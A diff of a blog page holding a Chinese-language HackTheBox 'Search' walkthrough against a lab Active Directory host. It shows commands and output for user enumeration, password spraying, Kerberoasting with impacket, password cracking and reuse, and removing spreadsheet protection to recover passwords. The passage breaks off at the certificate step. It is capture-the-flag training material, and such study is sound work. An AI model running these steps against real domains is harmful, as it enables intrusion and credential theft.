@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;422 10.10.11.129                                                                                                              端口扫描域环境： 12345678910">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;422 10.10.11.129   端口扫描域环境： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061$ nma">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Search - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/01/25/Search-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;422 10.10.11.129                                                                                                              端口扫描域环境： 12345678910">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;422 10.10.11.129   端口扫描域环境： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061$ nma">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022012401.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022012402.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022012403.jpg">
@@ -137,8 +137,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -160,7 +167,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -227,245 +234,84 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/422" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/422</a></li>
 <li>10.10.11.129</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012401.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012401.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>域环境：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.129</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 14:47 CST</span><br><span class="line">Nmap scan report for 10.10.11.129</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 987 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Search &amp;mdash; Just Testing IIS</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-24 06:49:48Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=research</span><br><span class="line">| Not valid before: 2020-08-11T08:13:35</span><br><span class="line">|_Not valid after:  2030-08-09T08:13:35</span><br><span class="line">|_ssl-date: 2022-01-24T06:51:10+00:00; 0s from scanner time.</span><br><span class="line">443/tcp  open  ssl/http      Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_ssl-date: 2022-01-24T06:51:10+00:00; 0s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=research</span><br><span class="line">| Not valid before: 2020-08-11T08:13:35</span><br><span class="line">|_Not valid after:  2030-08-09T08:13:35</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-title: Search &amp;mdash; Just Testing IIS</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2022-01-24T06:51:10+00:00; 0s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=research</span><br><span class="line">| Not valid before: 2020-08-11T08:13:35</span><br><span class="line">|_Not valid after:  2030-08-09T08:13:35</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2022-01-24T06:51:10+00:00; 0s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=research</span><br><span class="line">| Not valid before: 2020-08-11T08:13:35</span><br><span class="line">|_Not valid after:  2030-08-09T08:13:35</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=research</span><br><span class="line">| Not valid before: 2020-08-11T08:13:35</span><br><span class="line">|_Not valid after:  2030-08-09T08:13:35</span><br><span class="line">|_ssl-date: 2022-01-24T06:51:10+00:00; 0s from scanner time.</span><br><span class="line">Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2022-01-24T06:50:34</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3.1.1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 198.79 seconds</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012402.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012402.jpg" alt=""></p>
 <p>about us里一些用户名，可以做成字典：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012403.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012403.jpg" alt=""></p>
 <p>一张图片上提示信息：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">send password to xxx</span><br><span class="line">IsolationIsKey?</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012404.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012404.jpg" alt=""></p>
 <h2 id="users-txt"><a href="#users-txt" class="headerlink" title="users.txt"></a>users.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Keely Lyons</span><br><span class="line">Dax Santiago</span><br><span class="line">Sierra Frye</span><br><span class="line">Kyla Stewart</span><br><span class="line">Kaiara Spencer</span><br><span class="line">Dave Simpson</span><br><span class="line">Ben Thompson</span><br><span class="line">Chris Stewart</span><br><span class="line">Keely.Lyons</span><br><span class="line">Dax.Santiago</span><br><span class="line">Sierra.Frye</span><br><span class="line">Kyla.Stewart</span><br><span class="line">Kaiara.Spencer</span><br><span class="line">Dave.Simpson</span><br><span class="line">Ben.Thompson</span><br><span class="line">Chris.Stewar</span><br></pre></td></tr></table></figure>
 
 <h1 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h1><h2 id="userenum"><a href="#userenum" class="headerlink" title="userenum"></a>userenum</h2><p>根据用户名字典，枚举有效用户名：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_amd64 userenum users.txt -d search.htb --dc 10.10.11.129</span><br><span class="line"></span><br><span class="line">2022/01/20 10:47:33 &gt;  [+] VALID USERNAME:	 Keely.Lyons@search.htb</span><br><span class="line">2022/01/20 10:47:33 &gt;  [+] VALID USERNAME:	 Dax.Santiago@search.htb</span><br><span class="line">2022/01/20 10:47:33 &gt;  [+] VALID USERNAME:	 Sierra.Frye@search.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012405.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012405.jpg" alt=""></p>
 <h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>注意前面提示信息那张图，那个也是有效用户名，需要加到字典里，然后可以发现smb share：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.129 -u users.txt -p 'IsolationIsKey?' --shares</span><br><span class="line"></span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Hope.Sharp:IsolationIsKey?</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [+] Enumerated shares</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         -----           -----------     ------</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         C$                              Default share</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         helpdesk</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         NETLOGON        READ            Logon server share</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         RedirectedFolders$ READ,WRITE</span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         SYSVOL          READ            Logon server share</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012406.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012406.jpg" alt=""></p>
 <h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p>使用bloodhound通过ldap收集信息，需要加下hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.129 research.search.htb search.htb</span><br><span class="line"></span><br><span class="line">bloodhound-python -u Hope.Sharp -p &#39;IsolationIsKey?&#39; -ns 10.10.11.129 -d search.htb -c All</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012407.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012408.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012407.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012408.jpg" alt=""></p>
 <h2 id="users"><a href="#users" class="headerlink" title="users"></a>users</h2><p>根据已有信息生成新的用户名字典：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">impacket-samrdump search.htb/Hope.Sharp:IsolationIsKey?@10.10.11.129</span><br><span class="line"></span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">Santino.Benjamin</span><br><span class="line">Payton.Harmon</span><br><span class="line">Trace.Ryan</span><br><span class="line">Reginald.Morton</span><br><span class="line">Eddie.Stevens</span><br><span class="line">Cortez.Hickman</span><br><span class="line">Chace.Oneill</span><br><span class="line">Abril.Suarez</span><br><span class="line">Savanah.Velazquez</span><br><span class="line">Antony.Russo</span><br><span class="line">Cameron.Melendez</span><br><span class="line">Edith.Walls</span><br><span class="line">Lane.Wu</span><br><span class="line">Arielle.Schultz</span><br><span class="line">Bobby.Wolf</span><br><span class="line">Blaine.Zavala</span><br><span class="line">Margaret.Robinson</span><br><span class="line">Celia.Moreno</span><br><span class="line">Kaitlynn.Lee</span><br><span class="line">Kyler.Arias</span><br><span class="line">Saniyah.Roy</span><br><span class="line">Sarai.Boone</span><br><span class="line">Jermaine.Franco</span><br><span class="line">Alfred.Chan</span><br><span class="line">Jamar.Holt</span><br><span class="line">Sandra.Wolfe</span><br><span class="line">Rene.Larson</span><br><span class="line">Yareli.Mcintyre</span><br><span class="line">Griffin.Maddox</span><br><span class="line">Prince.Hobbs</span><br><span class="line">Armando.Nash</span><br><span class="line">Sonia.Schneider</span><br><span class="line">Maeve.Mann</span><br><span class="line">Lizeth.Love</span><br><span class="line">Amare.Serrano</span><br><span class="line">Savanah.Knox</span><br><span class="line">Frederick.Cuevas</span><br><span class="line">Marshall.Skinner</span><br><span class="line">Edgar.Jacobs</span><br><span class="line">Elisha.Watts</span><br><span class="line">Belen.Compton</span><br><span class="line">Amari.Mora</span><br><span class="line">Cadence.Conner</span><br><span class="line">Katelynn.Costa</span><br><span class="line">Sage.Henson</span><br><span class="line">Maren.Guzman</span><br><span class="line">Natasha.Mayer</span><br><span class="line">Chanel.Bell</span><br><span class="line">Scarlett.Parks</span><br><span class="line">Eliezer.Jordan</span><br><span class="line">Dax.Santiago</span><br><span class="line">Lillie.Saunders</span><br><span class="line">Jayla.Roberts</span><br><span class="line">Lorelei.Huang</span><br><span class="line">Taniya.Hardy</span><br><span class="line">Charlee.Wilkinson</span><br><span class="line">Monique.Moreno</span><br><span class="line">Desmond.Bonilla</span><br><span class="line">Claudia.Sharp</span><br><span class="line">Abbigail.Turner</span><br><span class="line">Yaritza.Riddle</span><br><span class="line">Tori.Mora</span><br><span class="line">Hugo.Forbes</span><br><span class="line">Jolie.Lee</span><br><span class="line">German.Rice</span><br><span class="line">Zain.Hopkins</span><br><span class="line">Hope.Sharp</span><br><span class="line">Kylee.Davila</span><br><span class="line">Melanie.Santiago</span><br><span class="line">Hunter.Kirby</span><br><span class="line">Annabelle.Wells</span><br><span class="line">Ada.Gillespie</span><br><span class="line">Gunnar.Callahan</span><br><span class="line">Aarav.Fry</span><br><span class="line">Colby.Russell</span><br><span class="line">Eve.Galvan</span><br><span class="line">Jeramiah.Fritz</span><br><span class="line">Cade.Austin</span><br><span class="line">Keely.Lyons</span><br><span class="line">Abby.Gonzalez</span><br><span class="line">Joy.Costa</span><br><span class="line">Vincent.Sutton</span><br><span class="line">Cesar.Yang</span><br><span class="line">Camren.Luna</span><br><span class="line">Tyshawn.Peck</span><br><span class="line">Keith.Hester</span><br><span class="line">Braeden.Rasmussen</span><br><span class="line">Angel.Atkinson</span><br><span class="line">Sierra.Frye</span><br><span class="line">Maci.Graves</span><br><span class="line">Judah.Frye</span><br><span class="line">Tristen.Christian</span><br><span class="line">Crystal.Greer</span><br><span class="line">Kayley.Ferguson</span><br><span class="line">Haven.Summers</span><br><span class="line">Isabela.Estrada</span><br><span class="line">Kaylin.Bird</span><br><span class="line">Angie.Duffy</span><br><span class="line">Claudia.Pugh</span><br><span class="line">Jordan.Gregory</span><br><span class="line">web_svc</span><br><span class="line">Tristan.Davies</span><br></pre></td></tr></table></figure>
 
 <h1 id="Kerberoast"><a href="#Kerberoast" class="headerlink" title="Kerberoast"></a>Kerberoast</h1><p>bloodhound可以发现两个 Kerberoastable账号，其中有一个web_svc是一个临时服务账号，这类账号一般易受攻击：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012409.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012409.jpg" alt=""></p>
 <h2 id="GetUserSPNs"><a href="#GetUserSPNs" class="headerlink" title="GetUserSPNs"></a>GetUserSPNs</h2><p>直接用impacket自带的GetUserSPNs就能够获取到hash：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetUserSPNs -request -dc-ip 10.10.11.129 search.htb/Hope.Sharp:IsolationIsKey?</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012410.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012410.jpg" alt=""></p>
 <h2 id="hashcrack"><a href="#hashcrack" class="headerlink" title="hashcrack"></a>hashcrack</h2><p>破解出来密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@3ONEmillionbaby</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012411.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012411.jpg" alt=""></p>
 <h1 id="Enum-1"><a href="#Enum-1" class="headerlink" title="Enum"></a>Enum</h1><p>使用得到的密码继续枚举，发现另一个用户复用这个密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.129 -u users3.txt -p '@3ONEmillionbaby' --continue-on-success</span><br><span class="line"></span><br><span class="line">SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby</span><br></pre></td></tr></table></figure>
 
 <h2 id="smb-1"><a href="#smb-1" class="headerlink" title="smb"></a>smb</h2><p>使用这个账号继续查看smb share，发现一个xlsx：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;search.htb&#x2F;RedirectedFolders$ -U edgar.jacobs</span><br><span class="line"></span><br><span class="line">cd edgar.jacobs\Desktop\</span><br><span class="line"> get Phishing_Attempt.xlsx</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012412.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012412.jpg" alt=""></p>
 <p>可以看到有隐藏列，没有显示C：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012413.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012413.jpg" alt=""></p>
 <h2 id="xlsx"><a href="#xlsx" class="headerlink" title="xlsx"></a>xlsx</h2><p>xlsx就是压缩文件，可以直接解压，删除其中的sheetProtection：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unzip Phishing_Attempt.xlsx</span><br><span class="line"></span><br><span class="line">xl&#x2F;worksheets&#x2F;sheet2.xml</span><br><span class="line"></span><br><span class="line">&lt;sheetProtection algorithmName&#x3D;&quot;SHA-512&quot; hashValue&#x3D;&quot;hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39&#x2F;22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg&#x3D;&#x3D;&quot; saltValue&#x3D;&quot;U9oZfaVCkz5jWdhs9AA8nA&#x3D;&#x3D;&quot; spinCount&#x3D;&quot;100000&quot; sheet&#x3D;&quot;1&quot; objects&#x3D;&quot;1&quot; scenarios&#x3D;&quot;1&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">zip -r Phishing.xlsx .</span><br></pre></td></tr></table></figure>
 
 <p>然后我们能够得到大概是内部钓鱼演练获取到的密码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012414.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012414.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>根据bloodhound分析结果，Sierra.Frye和Abby.Gonzalez在到域控的攻击路径中，用Sierra.Frye对应密码访问smb ，得到user.txt:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smbclient //search.htb/RedirectedFolders$ -U Sierra.Frye</span><br><span class="line">cd sierra.frye</span><br><span class="line">cd desktop</span><br><span class="line">get user.txt</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012415.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012415.jpg" alt=""></p>
 <h1 id="certificate"><a href="#certificate" class="headerlink" title="certificate"></a>certificate</h1><p>downloads目录里backup可以发现证书文件：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012416.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012416.jpg" alt=""></p>
 <p>尝试导入浏览器，需要密码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012417.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022012417.jpg" alt=""></p>
 <h2 id="staff"><a href="#staff" class="headerlink" title="staff"></a>staff</h2><p>简单的目录扫描可以知道staff是需要证书访问的：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
